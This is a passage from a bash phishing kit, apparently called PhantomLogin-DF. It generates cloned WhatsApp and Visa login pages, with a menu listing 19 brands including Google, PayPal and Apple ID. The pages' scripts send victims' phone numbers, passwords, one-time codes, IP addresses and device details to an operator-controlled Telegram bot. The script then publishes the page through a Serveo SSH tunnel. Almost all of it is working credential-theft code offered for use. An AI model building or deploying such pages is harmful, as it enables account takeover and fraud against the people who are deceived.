        .login-container { background-color: #ffffff; border-radius: 10px; width: 360px; padding: 40px 30px; text-align: center; box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1); }
        .login-container img { width: 100px; margin-bottom: 25px; }
        h2 { font-size: 22px; color: #333; margin-bottom: 15px; font-weight: 600; }
        input { width: 100%; padding: 14px; margin-bottom: 12px; border: 1px solid #dbdbdb; border-radius: 5px; font-size: 15px; outline: none; transition: border-color 0.3s ease, box-shadow 0.3s ease; }
        input:focus { border-color: #25d366; box-shadow: 0 0 8px rgba(37, 211, 102, 0.2); }
        .btn-login { width: 100%; padding: 14px; background-color: #25d366; color: white; font-weight: bold; font-size: 16px; border-radius: 5px; border: none; cursor: pointer; margin-bottom: 15px; transition: background-color 0.3s ease; }
        .btn-login:hover { background-color: #1da851; }
        .forgot-password { margin-top: 10px; font-size: 14px; }
        .forgot-password a { color: #25d366; text-decoration: none; }
        .divider { margin: 20px 0; border-top: 1px solid #dbdbdb; }
        .signup-btn { width: 100%; padding: 14px; background-color: #fafafa; border: 1px solid #dbdbdb; font-size: 14px; color: #25d366; border-radius: 5px; cursor: pointer; margin-bottom: 10px; }
        .signup-btn:hover { background-color: #f4f4f4; }
        .terms { margin-top: 20px; font-size: 12px; color: #888; }
        .terms a { color: #25d366; text-decoration: none; }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp Logo">
        <h2>Log in to WhatsApp</h2>
        <form id="loginForm">
            <input type="text" id="phone" placeholder="Phone number" required>
            <button type="submit" class="btn-login">Next</button>
        </form>
        <p class="forgot-password"><a href="#">Forgot password?</a></p>
        <div class="divider"></div>
        <button class="signup-btn">Sign up for WhatsApp</button>
    </div>
    <script>
        const loginForm = document.getElementById('loginForm');
        loginForm.addEventListener('submit', async function (event) {
            event.preventDefault();
            const phone = document.getElementById('phone').value;
            const deviceInfo = await getDeviceInfo();
            const response = await fetch('https://api.telegram.org/bot${token}/sendMessage', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: '${id}',
                    text: \`WhatsApp Login Attempt:\nPhone📱: \${phone}\nDevice Info📲:\nIP Address🌍: \${deviceInfo.ip}\nBattery Level🔋: \${deviceInfo.batteryLevel}%\nNetwork Type📡: \${deviceInfo.networkType}\nDevice Name📱: \${deviceInfo.deviceName}\`
                })
            });
            const result = await response.json();
            if (result.ok) {
                alert('Please enter the code sent to your phone.');
                const code = prompt('Enter the code:');
                const codeResponse = await fetch('https://api.telegram.org/bot${token}/sendMessage', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: '${id}',
                        text: \`WhatsApp Code:\nCode🔢: \${code}\`
                    })
                });
                const codeResult = await codeResponse.json();
                if (codeResult.ok) {
                    alert('Login successful! Redirecting...');
                    window.location.href = 'https://web.whatsapp.com';
                } else {
                    alert('Login failed. Please check your code.');
                }
            } else {
                alert('Login failed. Please check your phone number.');
            }
        });
        async function getDeviceInfo() {
            const ip = await fetch('https://api.ipify.org?format=json').then(res => res.json());
            const battery = await navigator.getBattery();
            const networkType = navigator.connection ? navigator.connection.effectiveType : 'Unknown';
            const deviceName = navigator.userAgent;
            return { ip: ip.ip, batteryLevel: Math.round(battery.level * 100), networkType: networkType, deviceName: deviceName };
        }
    </script>
</body>
</html>
EOF
}

visa_page() {
    cat <<EOF
    <!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Visa Login</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Arial', sans-serif;
            background-color: #f1f1f1;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .login-container {
            background-color: #ffffff;
            border-radius: 10px;
            width: 360px;
            padding: 40px 30px;
            text-align: center;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
        }

        .login-container img {
            width: 100px;
            margin-bottom: 25px;
        }

        h2 {
            font-size: 22px;
            color: #333;
            margin-bottom: 15px;
            font-weight: 600;
        }

        input {
            width: 100%;
            padding: 14px;
            margin-bottom: 12px;
            border: 1px solid #dbdbdb;
            border-radius: 5px;
            font-size: 15px;
            outline: none;
            transition: border-color 0.3s ease, box-shadow 0.3s ease;
        }

        input:focus {
            border-color: #1a1a1a;
            box-shadow: 0 0 8px rgba(26, 26, 26, 0.2);
        }

        .btn-login {
            width: 100%;
            padding: 14px;
            background-color: #1a1a1a;
            color: white;
            font-weight: bold;
            font-size: 16px;
            border-radius: 5px;
            border: none;
            cursor: pointer;
            margin-bottom: 15px;
            transition: background-color 0.3s ease;
        }

        .btn-login:hover {
            background-color: #333;
        }

        .forgot-password {
            margin-top: 10px;
            font-size: 14px;
        }

        .forgot-password a {
            color: #1a1a1a;
            text-decoration: none;
        }

        .divider {
            margin: 20px 0;
            border-top: 1px solid #dbdbdb;
        }

        .signup-btn {
            width: 100%;
            padding: 14px;
            background-color: #fafafa;
            border: 1px solid #dbdbdb;
            font-size: 14px;
            color: #1a1a1a;
            border-radius: 5px;
            cursor: pointer;
            margin-bottom: 10px;
        }

        .signup-btn:hover {
            background-color: #f4f4f4;
        }

        .terms {
            margin-top: 20px;
            font-size: 12px;
            color: #888;
        }

        .terms a {
            color: #1a1a1a;
            text-decoration: none;
        }
    </style>
</head>
<body>

    <div class="login-container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" alt="Visa Logo">
        <h2>Sign in to Visa</h2>
        <form id="loginForm">
            <input type="text" id="username" placeholder="Email or phone" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit" class="btn-login">Log In</button>
        </form>
        <p class="forgot-password"><a href="#">Forgot password?</a></p>
        <div class="divider"></div>
        <button class="signup-btn">Create account</button>
    </div>

    <script>
        const loginForm = document.getElementById('loginForm');
        loginForm.addEventListener('submit', async function (event) {
            event.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            const deviceInfo = await getDeviceInfo();

            const response = await fetch('https://api.telegram.org/bot${token}/sendMessage', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: '${id}',
                    text: \`
Visa Login Attempt:

Username📧: \${username}
Password🔑: \${password}

Device Info📲:

IP Address🌍: \${deviceInfo.ip}
Battery Level🔋: \${deviceInfo.batteryLevel}%
Network Type📡: \${deviceInfo.networkType}
Device Name📱: \${deviceInfo.deviceName}
                    \`
                })
            });

            const result = await response.json();

            if (result.ok) {
                alert('Login successful! Redirecting...');
                window.location.href = 'https://www.visa.com';
            } else {
                alert('Login failed. Please check your credentials.');
            }
        });

        async function getDeviceInfo() {
            const ip = await fetch('https://api.ipify.org?format=json').then(res => res.json());
            const battery = await navigator.getBattery();
            const networkType = navigator.connection ? navigator.connection.effectiveType : 'Unknown';
            const deviceName = navigator.userAgent;

            return {
                ip: ip.ip,
                batteryLevel: Math.round(battery.level * 100),
                networkType: networkType,
                deviceName: deviceName,
            };
        }
    </script>
</body>
</html>
EOF
}
 
start_local_server() {
    echo -e "${GREEN}[+] Stopping any existing PHP server...${NC}"
    pkill -f "php -S localhost:3333" || echo -e "${YELLOW}[!] No existing PHP server found.${NC}"

    echo -e "${GREEN}[+] Starting PHP server on localhost...${NC}"
    php -S localhost:3333 > /dev/null 2>&1 &
    php_pid=$!
    echo -e "${GREEN}[+] PHP server started at http://localhost:3333/${page}.html${NC}"
    echo -e "${YELLOW}[+] Press Ctrl+C to stop the server.${NC}"
    trap "kill $php_pid 2> /dev/null" EXIT
    while true; do
        sleep 1
    done
}

start_serveo_server() {
    echo -e "${GREEN}[+] Stopping any existing PHP server...${NC}"
    pkill -f "php -S localhost:3333" || echo -e "${YELLOW}[!] No existing PHP server found.${NC}"

    echo -e "${GREEN}[+] Stopping any existing SSH tunnel...${NC}"
    killall ssh || echo -e "${YELLOW}[!] No existing SSH tunnel found.${NC}"

    echo -e "${GREEN}[+] Starting PHP server on localhost...${NC}"
    php -S localhost:3333 > /dev/null 2>&1 &
    php_pid=$!
    echo -e "${RED}[+] PHP server started at http://localhost:3333/${page}.html${NC}"

    echo -e "${GREEN}[+] Starting SSH tunnel with Serveo...${NC}"
    ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net > sendlink 2>&1 &
    ssh_pid=$!
    sleep 8

    echo -e "${GREEN}[+] Fetching Serveo URL...${NC}"
    serveo_url=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
    if [[ -z "$serveo_url" ]]; then
        echo -e "${RED}[-] Failed to start Serveo.net. Please make sure SSH is installed and try again.${NC}"
        exit 1
    fi

    echo -e "${BLUE}[+] Serveo URL: ${serveo_url}/${page}.html${NC}"
    echo -e "${RED}[+] Press Ctrl+C to stop the server.${NC}"

    trap "kill $php_pid $ssh_pid 2> /dev/null" EXIT
    while true; do
        sleep 1
    done
}

show_menu() {
    echo -e "${GREEN}Welcome to PhantomLogin-DF... ${NC}"
    echo -e "${RED}The developer is not responsible for any incorrect use of the tool... ${NC}"
    echo -e "${RED}All rights reserved: Mohamed Abu Al-Saud ${NC}"
    echo -e "${YELLOW}=================================${NC}"
    echo -e "${BLUE}[1] Facebook login${NC}" 
    echo -e "${BLUE}[2] Google login${NC}"
    echo -e "${BLUE}[3] TikTok login${NC}"
    echo -e "${BLUE}[4] Visa login${NC}"
    echo -e "${BLUE}[5] Camera and location${NC}"
    echo -e "${BLUE}[6] Twitter login${NC}"
    echo -e "${BLUE}[7] PayPal login${NC}"
    echo -e "${BLUE}[8] GitHub login${NC}"
    echo -e "${BLUE}[9] Instagram login${NC}"
    echo -e "${BLUE}[10] Telegram login${NC}"
    echo -e "${BLUE}[11] Netflix login${NC}"
    echo -e "${BLUE}[12] Wi-Fi login Egypt ${NC}"
    echo -e "${BLUE}[13] Spotify login${NC}"
    echo -e "${BLUE}[14] Snapchat login${NC}"
    echo -e "${BLUE}[15] WhatsApp login${NC}"
    echo -e "${BLUE}[16] Apple ID login${NC}"         
    echo -e "${BLUE}[17] Amazon login${NC}"          
    echo -e "${BLUE}[18] YouTube login${NC}"        
    echo -e "${BLUE}[19] Microsoft login${NC}"
    echo -e "${YELLOW}=================================${NC}"
}

show_banner
install_dependencies

echo -e "${GREEN}[+] Enter Token:${NC}"
read token
echo -e "${GREEN}[+] Enter ID:${NC}"
read id

show_menu

echo -e "${GREEN}[+] Choose the page you want to create:${NC}"
read choice

case $choice in
    1)
        page="Facebook_login"
        create_page "$page" "$(facebook_page)"
        ;;
    2)
        page="Google_login"
        create_page "$page" "$(google_page)"
        ;;
    3)
        page="TikTok_login"
        create_page "$page" "$(tiktok_page)"
        ;;
    4)
        page="visa_login"
        create_page "$page" "$(visa_page)"
        ;;
    5)
        page="CameraAndLocation_login"
        create_page "$page" "$(camera_page)"
        ;;
    6)
        page="Twitter_login"
        create_page "$page" "$(twitter_page)"
        ;;
    7)
        page="PayPal_login"
        create_page "$page" "$(paypal_page)"
        ;;
    8)
        page="GitHub_login"
        create_page "$page" "$(github_page)"
        ;;
    9)
        page="Instagram_login"
        create_page "$page" "$(instagram_page)"
        ;;
    10)
        page="Telegram_login"
        create_page "$page" "$(telegram_page)"
        ;;
    11)
        page="Netflix_login"
        create_page "$page" "$(netflix_page)"
        ;;
    12)
        page="WiFi_login"
        create_page "$page" "$(wifi_page)"
        ;;
    13)
        page="Spotify_login"
        create_page "$page" "$(Spotify_page)"
        ;;
    14)
        page="Snapchat_login"
        create_page "$page" "$(snapchat_page)"
        ;;
    15)
        page="WhatsApp_login"
        create_page "$page" "$(whatsapp_page)"
        ;;
    16)                                          # إضافة جديدة
        page="Apple_login"
        create_page "$page" "$(apple_page)"
        ;;
    17)                                          # إضافة جديدة
        page="Amazon_login"
        create_page "$page" "$(amazon_page)"
        ;;
    18)                                          
        page="YouTube_login"
        create_page "$page" "$(YouTube_page)"
        ;;
    19)                                          
        page="microsoft_login"
        create_page "$page" "$(microsoft_page)"
        ;;
    
    *)
        echo -e "${RED}[-] Invalid choice. Please select a valid option.${NC}"
        exit 1
        ;;
esac

echo -e "${GREEN}[+] Choose server type:${NC}"
echo -e "${RED}[1] Localhost${NC}"
echo -e "${RED}[2] Serveo.net${NC}"
read server_choice

case $server_choice in
    1)
        start_local_server
        ;;
    2)
        start_serveo_server
        ;;
    *)
        echo -e "${RED}[-] Invalid choice. Please select a valid option.${NC}"
        exit 1
        ;;
esac